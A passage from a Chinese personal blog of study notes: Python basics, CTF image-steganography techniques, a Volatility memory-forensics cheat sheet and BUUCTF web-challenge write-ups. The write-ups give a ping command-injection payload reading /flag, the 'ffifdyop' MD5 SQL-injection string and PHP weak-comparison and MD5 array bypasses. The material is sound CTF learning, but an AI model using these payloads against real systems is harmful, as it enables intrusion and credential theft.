+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">UTF-8编码： b&#x27;\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b&#x27;</span><br><span class="line">GBK编码： b&#x27;\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc&#x27;</span><br><span class="line">UTF-8解码： 菜鸟教程</span><br><span class="line">GBK解码： 菜鸟教程</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>f&#x3D;open(“文件路径”,”r&#x2F;w&#x2F;a”,encoding&#x3D;”UTF-8”) &#x2F;&#x2F;f是文件对象名称<br>&#x2F;&#x2F;w模式，输入的内容会覆盖原来文件的内容，a是在文件后追加内容，如果文件不存在就会创建文件<br>f.read(num)：读取指定长度字节，不指定num就读取全部<br>f.readlines():读取文件的全部行，封装到列表中<br>f.readline():读取一行<br>for line in f: for循环文件行，一次循环得到一行数据，每一行返回成一个字符串，并且在末尾会有一个换行符<br>读取文件有个指针，所以如果前面读取到第一个数，下面的读取就会从第二个数开始读取<br>f.write(content):往文件中写入内容<br>f.close():文件关闭<br>with open(“文件路径”,”r&#x2F;w&#x2F;a”,encoding&#x3D;”UTF-8”) as f:通过with open语法打开文件，可以自动关闭文件  &#x2F;&#x2F;f是文件对象名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;E:/test.txt&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;)</span><br><span class="line">count = 0</span><br><span class="line">for line in f:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    words = line.split(&quot; &quot;)</span><br><span class="line">    for word in words:</span><br><span class="line">        if word == &quot;ttt&quot;:</span><br><span class="line">            count += 1</span><br><span class="line">print(count)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<p>先打开以只读的方式打开文件，计数器置零，用for循环，循环得到每一行的数据，用字符串的strip方法首尾去空，避免&#x2F;n对匹配字符串的影响，然后用split方法将字符串以空格为分界，变成列表的形式，再用一个for循环将列表内的每个元素和”ttt”比较，如果相同，则计数器加1</p>
+<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>就是程序的bug，捕获异常是为了在程序出现异常之前做好准备，当出现异常的时候有处理的手段，这样就不会直接导致程序的崩溃<br>基本捕获语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">	可能发生错误的代码</span><br><span class="line">except:</span><br><span class="line">	如果出现异常执行的代码</span><br><span class="line">else： //可选</span><br><span class="line">	print(&quot;没有出现异常&quot;)</span><br><span class="line">finally: //可选</span><br><span class="line">  f.close()</span><br></pre></td></tr></table></figure>
+<p>如果try出现了异常就执行except的代码，也可以在没有出现异常的时候执行else代码,finally是最后必须要执行的代码，不管有没有异常。<br>捕获指定异常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">	print(name)</span><br><span class="line">except NameError as e:</span><br><span class="line">	print(&quot;出现了变量未定义的异常&quot;)</span><br><span class="line">	print(e) //e是看作该变量未定义异常的别名，记录了异常的具体信息</span><br></pre></td></tr></table></figure>
+<p>如果要捕获多个异常就可以用元组将上面的NameError进行替换，如果捕获全部异常就写<code>except Exception as e:</code></p>
+<ul>
+<li>异常的传递。。。</li>
+</ul>
+<h2 id="python的模块"><a href="#python的模块" class="headerlink" title="python的模块"></a>python的模块</h2><p><strong>定义</strong><br>python模块是一个python文件，以.py结尾，模块能定义函数，类和变量，模块里也能包含可执行的代码</p>
+<p><strong>作用</strong><br>python中有很多各种不同的模块，每一个模块都可以帮助我们快速实现一些功能，比如实现时间相关的功能就可以使用time模块，模块可以被认为是一个工具包。<br><img src="/img/193.png"><br>eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import time [as tt]//模块名,可以改成别名tt，后面就写tt.sleep</span><br><span class="line">time.sleep(6) //模块名.功能名()</span><br><span class="line"></span><br><span class="line">from time import *</span><br><span class="line">sleep(6)</span><br><span class="line"></span><br><span class="line">from time import sleep [as sl]//导入time中的sleep功能,别名可代替sleep</span><br><span class="line">sleep(6)</span><br></pre></td></tr></table></figure>
+<p>按下ctrl然后鼠标左键点击模块名就可以查看.py文件的源代码</p>
+<p><strong>自定义python模块</strong><br>新建一个python文件，命名并定义函数，模块名称就是文件名字，其他文件直接调用就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def test(x, y):</span><br><span class="line">    return x+y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test(1,2)</span><br></pre></td></tr></table></figure>
+<p>在if这个语句中的代码不会在导入模块的时候执行，所以既可以满足测试模块中函数的可行性又可以避免在导入模块的时候执行了代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__all__ = [&#x27;test&#x27;] //列表</span><br><span class="line">def test(x, y):</span><br><span class="line">    return x+y</span><br><span class="line">def test1(x, y):</span><br><span class="line">    return x-y</span><br></pre></td></tr></table></figure>
+<p>如果在导入的时候如果是<code>from my_module import *</code>,则只能使用test</p>
+<p><strong>python包</strong></p>
+<p>python包是一个文件夹，可以存放很多模块，由各个模块和__init__.py组成，<code>__init__.py</code>用来标识这个文件夹是一个python包，导入包中的模块：import 包名.模块名，下面的使用就是包名.模块名.目标</p>
+<ul>
+<li>第三方包(非python官方)，安装后就可以使用，<code>pip install 包名</code>就可以安装了，默认安装是连接国外的网站的，可以通过<code>pip install -i 网址 包名</code> 指定网址安装</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/misc-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/misc-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.html" itemprop="url">misc-图片隐写</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-24T23:03:46+08:00">
+                2023-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="基于DCT域的JPG图片隐写"><a href="#基于DCT域的JPG图片隐写" class="headerlink" title="基于DCT域的JPG图片隐写"></a>基于DCT域的JPG图片隐写</h2><h3 id="关于JPG图像的压缩"><a href="#关于JPG图像的压缩" class="headerlink" title="关于JPG图像的压缩"></a>关于JPG图像的压缩</h3><ul>
+<li>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度</li>
+</ul>
+<p>因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
+<ul>
+<li>常见的隐写方法有JSteg、JPHide、Outguess、F5等等</li>
+</ul>
+<h3 id="Stegdetect"><a href="#Stegdetect" class="headerlink" title="Stegdetect"></a>Stegdetect</h3><ul>
+<li>它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息</li>
+<li>具有基于字典暴力<strong>破解密码</strong>方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息</li>
+</ul>
+<h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a>JPHS</h3><p>软件里面主要包含了两个程序JPHIDE和JPSEEK</p>
+<ul>
+<li>JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能</li>
+<li>JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件</li>
+</ul>
+<p>介绍了相关概念和两个工具，我们来看个例题<br><img src="/img/80.png"><br>打开是<br><img src="/img/81.png"><br>由于是jpg格式，我们先用Stegdetect查看一下是否存在JPG图片隐写<br>输入stegdetect.exe -tjopi -s 10.0 level4.jpg<br><img src="/img/82.png"><br>存在JPHide隐写<br>在JPHS打开level4.jpg<br>点击seek<br><img src="/img/83.png"><br>发现要密码<br>回到stegdetect，爆破密码<br>stegbreak.exe -r rules.ini -f password.txt level4.jpg<br><img src="/img/84.png"><br>将爆出的密码输入后随便输入一个文件名即可得到隐写内容<br><img src="/img/85.png"><br>这是一道套娃题，这里只是其中用到jpg隐写的部分<br>因为outguess隐写要用到虚拟机，所以启动了kali，结果发现网络不连通<br>ping baidu.com<br>发现ping不通<br>看了好几篇文章，终于解决了<br>先是发现启用联网没开，然后还是不行<br><img src="/img/86.png"><br>后来看了这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/nanke_4869/article/details/123662430">https://blog.csdn.net/nanke_4869/article/details/123662430</a><br>还原了默认设置才解决<br><img src="/img/87.png"></p>
+<h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>对于outguess方式嵌入隐藏信息的，直接在虚拟机使用outguess<br>具体命令：<strong>outguess (-k key) -r 图片名称 -t 保存的文件名称</strong><br>比如这题<br>首先在图片所在的文件夹下打开终端<br>输入：<strong>outguess -r outguess.jpg -t 11.txt</strong><br><img src="/img/88.png"><br>打开11.txt，发现是乱码，在windows打开也一样<br><img src="/img/89.png"><br>这里就需要在图片属性中找到key<br><img src="/img/90.png"><br>修改指令为<br><strong>outguess -k gUNrbbdR9XhRBDGpzz -r outguess.jpg -t 11.txt</strong><br><img src="/img/91.png"></p>
+<h3 id="F5-steganography"><a href="#F5-steganography" class="headerlink" title="F5-steganography"></a>F5-steganography</h3><ul>
+<li>指令：<strong>java Extract Misc.jpg(图片名称) [-p password]可选项</strong></li>
+<li>自动会在当前文件夹下生成output.txt文件<br>这里需要知道所有的zip文件，都是以PK这两个字母开头的，可以使用记事本查看<br><img src="/img/92.png"><br>将后缀改为zip即可</li>
+</ul>
+<h3 id="异或和盲水印"><a href="#异或和盲水印" class="headerlink" title="异或和盲水印"></a>异或和盲水印</h3><ul>
+<li>遇到相同的图片时可能是以下两种情况</li>
+</ul>
+<ol>
+<li>异或 2. 盲水印</li>
+</ol>
+<ul>
+<li>遇到两个酷似二维码的图片，可能是异或</li>
+<li>解密工具：stegsolve,盲水印脚本，QR Research</li>
+<li>例1：<br><img src="/img/93.png"><br>使两个二维码图片结合<br><img src="/img/94.png"><br>再使用QR Research解码成功<br><img src="/img/95.png"></li>
+<li>例2：<br>用010editor打开图片的16进制，没有发现信息<br>于是我们在kali中使用binwalk Heart.png查看有没有可分离的隐藏文件<br><img src="/img/96.png"><br>发现有两张png<br>输入指令：<strong>foremost -T Heart.png</strong><br>or <strong>binwalk -e Heart.png</strong><br>亲测发现解出来的文件夹里的内容不一样，用foremost可以解出两张图片<br>这里有些许疑问，好像是binwalk分离的更细致<br>测试过不是盲水印，然后使用stegsolve拼接两张图片<br><img src="/img/97.png"><br>这里也有盲水印的例题<br><img src="/img/113.png"></li>
+<li>注意：程序python2和python3版本的加解密结果会有所不同，主要原因是python2和python3 random的算法不同，如果要让python3兼容python2的random算法请加 –oldseed参数。<br>python  bwmforpy3.py decode day1.png day2.png flag.png –oldseed<br><img src="/img/114.png"><br>得到flag.png<br><img src="/img/115.png"></li>
+</ul>
+<p><img src="/img/116.png"></p>
+<h3 id="绘制二维码"><a href="#绘制二维码" class="headerlink" title="绘制二维码"></a>绘制二维码</h3><p>使用下面的脚本就行，修改str和MAX即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">60</span>    <span class="comment">#二维码长宽</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;str&quot;</span>   <span class="comment">#二进制数据</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line"><span class="comment">#pic.save(&quot;flag.png&quot;)</span></span><br></pre></td></tr></table></figure>
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/FORENSICS.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/FORENSICS.html" itemprop="url">FORENSICS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-22T20:21:16+08:00">
+                2023-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><p>经常利用volatility分析</p>
+<ul>
+<li>取证文件后缀 .raw、.vmem、.img</li>
+<li>常用命令(imageinfo，pslist，dumpfiles，memdump)</li>
+<li>可疑的进程（notepad，cmd）</li>
+<li>常见文件后缀dmg，img</li>
+<li>和磁盘取证结合起来考察</li>
+</ul>
+<h2 id="volatility基础命令"><a href="#volatility基础命令" class="headerlink" title="volatility基础命令"></a>volatility基础命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f [image] ‐-profile=[profile][plugin] 命令</span><br><span class="line">其中 -f 后面加的是要取证的文件， --profile 后加的是工具识别出的系统版本， [plugin] 是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>imageinfo</strong>：显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数</li>
+<li><strong>pslist</strong>:该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</li>
+<li><strong>psscan</strong>：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</li>
+<li><strong>mendump</strong>：提取出指定进程，常用foremost 来分离里面的文件</li>
+<li><strong>cmdscan</strong>：可用于查看终端记录</li>
+<li><strong>notepad</strong>：查看当前展示的 notepad 文本</li>
+<li><strong>filescan</strong>：扫描所有的文件列表</li>
+<li><strong>dumpfiles</strong>：导出某一文件(指定虚拟地址)需要指定偏移量 -Q 和输出目录 -D</li>
+<li><strong>editbox</strong>：显示有关编辑控件（曾经编辑过的内容）的信息</li>
+<li><strong>screenshot</strong>：保存基于GDI窗口的伪截屏</li>
+<li><strong>clipboard</strong>：查看剪贴板信息</li>
+<li><strong>iehistory</strong>：检索IE浏览器历史记录</li>
+<li><strong>systeminfo</strong>：显示关于计算机及其操作系统的详细配置信息（插件）</li>
+<li><strong>hashdump</strong>：查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</li>
+<li><strong>mftparser</strong>：恢复被删除的文件</li>
+<li><strong>svcscan</strong>：扫描 Windows 的服务</li>
+<li><strong>connscan</strong>：查看网络连接</li>
+<li><strong>envars</strong>：查看环境变量</li>
+<li><strong>dlllist</strong>: 列出某一进程加载的所有dll文件</li>
+<li><strong>hivelist</strong>: 列出所有的注册表项及其虚拟地址和物理地址</li>
+<li><strong>timeliner</strong>: 将所有操作系统事件以时间线的方式展开<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120390580">https://blog.csdn.net/q20010619/article/details/120390580</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/BUUCTF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/BUUCTF.html" itemprop="url">BUUCTF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-16T10:45:20+08:00">
+                2023-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h1><p>在 CTF 中，flag 文件往往位于根目录下，但也不要被反套路了<br>先ping一下它自己<br><img src="/img/74.png"><br>TTL表示您使用ping命令发送的数据包在网络中的持续时间。<br>TTL&#x3D;56表示你的机器发送数据包到对方IP并确认，要花费56毫秒。<br>一般情况下，TTL&#x3D;56表示对方是Windows 98或者是Linux操作系统<br>尝试使用管道符<br>127.0.0.1 | ls &#x2F;查看根目录文件<br>127.0.0.1 | cat &#x2F;flag 查看根目录下的flag文件<br><img src="/img/75.png"><br><img src="/img/76.png"><br>得到flag</p>
+<h1 id="BUUCTF-BJDCTF2020-Easy-MD51"><a href="#BUUCTF-BJDCTF2020-Easy-MD51" class="headerlink" title="BUUCTF [BJDCTF2020]Easy MD51"></a>BUUCTF [BJDCTF2020]Easy MD51</h1><p>1、 PHP md5() 函数</p>
+<ul>
+<li>语法：md5(string,raw) </li>
+<li>string：需要计算的字符串</li>
+<li>raw:规定十六进制或二进制输出格式<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认 32 字符十六进制数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$str = &quot;ffifdyop&quot;; </span><br><span class="line">echo &quot;TRUE - Raw 16 character binary format: &quot;.md5($str, TRUE).&quot;&lt;br&gt;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+结果：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUE - Raw 16 character binary format: &#x27;or&#x27;6�]��!r,��b&lt;br&gt;</span><br></pre></td></tr></table></figure>
+ffifdyop的原始 16 字符二进制格式以’or’6开头，数字开头的字符串都会被识别为True，可以用作注入拼接</li>
+</ul>
+<h2 id="php比较绕过"><a href="#php比较绕过" class="headerlink" title="php比较绕过"></a>php比较绕过</h2><ul>
+<li>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换<br>1、使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。<br>2、用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。</li>
+</ul>
+<h3 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h3><ul>
+<li>字符串和数字比较使用&#x3D;&#x3D;时，若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(12==&quot;12&quot;)                                 //true</span><br><span class="line">var_dump(12==&quot;12aa&quot;)                               //true</span><br><span class="line">var_dump( &quot;admin&quot;==0)							    //true</span><br><span class="line">var_dump(false==&quot;&quot;==0==NULL)						//true</span><br><span class="line"></span><br><span class="line">var_dump(&#x27;a&#x27; == 0);	    //bool(true)</span><br><span class="line">var_dump(&#x27;1a&#x27; == 1);	//bool(true)</span><br><span class="line">var_dump(&#x27;12a&#x27; == 1);	//bool(false)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="字符串和布尔型"><a href="#字符串和布尔型" class="headerlink" title="字符串和布尔型"></a>字符串和布尔型</h3><ul>
+<li>布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(true==&quot;hyuf&quot;)                   //true</span><br><span class="line">var_dump(True == 0);	                 //bool(false)</span><br><span class="line">var_dump(True == &#x27;False&#x27;);	             //bool(true)</span><br><span class="line">var_dump(True == 2);	                 //bool(true)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="字符串”0”和科学计数法"><a href="#字符串”0”和科学计数法" class="headerlink" title="字符串”0”和科学计数法"></a>字符串”0”和科学计数法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$str1 = &quot;a&quot;;</span><br><span class="line">echo md5($str1);	//0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">var_dump(md5($str1) == &#x27;0&#x27;);	//bool(false)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">$str2 = &quot;s224534898e&quot;;</span><br><span class="line">echo md5($str2);	//0e420233178946742799316739797882</span><br><span class="line">var_dump(md5($str2) == &#x27;0&#x27;);	//bool(true)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">$str3 = &#x27;a1b2edaced&#x27;;</span><br><span class="line">echo md5($str3);	//0e45ea817f33691a3dd1f46af81166c4bool</span><br><span class="line">var_dump(md5($str3) == &#x27;0&#x27;);	//bool(false)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);	//bool(true) </span><br></pre></td></tr></table></figure>
+<ul>
+<li>开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的<br>1、第一条只是0开头，所以只能当普通字符串，结果为false<br>2、第二条0e后面全为数字，符合要求，结果为true<br>3、第三条虽然为0e，但是后面不全为数字，所以结果为false<br>4、数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较</li>
+</ul>
+<h3 id="strcmp-函数漏洞-php5-3之前"><a href="#strcmp-函数漏洞-php5-3之前" class="headerlink" title="strcmp() 函数漏洞 php5.3之前"></a>strcmp() 函数漏洞 php5.3之前</h3><ul>
+<li>strcmp(s1,s2)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当s1&lt;s2时，返回为负数 注意不一定是-1，测试结果是比较字符串长度</span><br><span class="line">当s1==s2时，返回值= 0</span><br><span class="line">当s1&gt;s2时，返回正数 注意不一定是1，测试结果是比较字符串长度</span><br><span class="line">如果两个字符串不同等，但是字符串长度相同，就比较从哪一位开始不同的，然后比较那一位的大小</span><br><span class="line">即：两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇&#x27;\0&#x27;为止。如：</span><br><span class="line">&quot;A&quot;&lt;&quot;B&quot; &quot;a&quot;&gt;&quot;A&quot; &quot;computer&quot;&gt;&quot;compare&quot;</span><br></pre></td></tr></table></figure></li>
+<li>利用点：这里面只能比较字符串，不能比较数字等其他形式的参数，如果出现了其它参数，则会retrun null，有些题目就是利用这一点来进行和0的完成比较<br>一般使用<strong>数组</strong>来触发</li>
+</ul>
+<h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;]))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">//name[]=1&amp;password[]=2</span><br><span class="line">PHP中md5()函数无法处理数组（会返回NULL）</span><br><span class="line">==的也可以用数组绕过</span><br></pre></td></tr></table></figure>
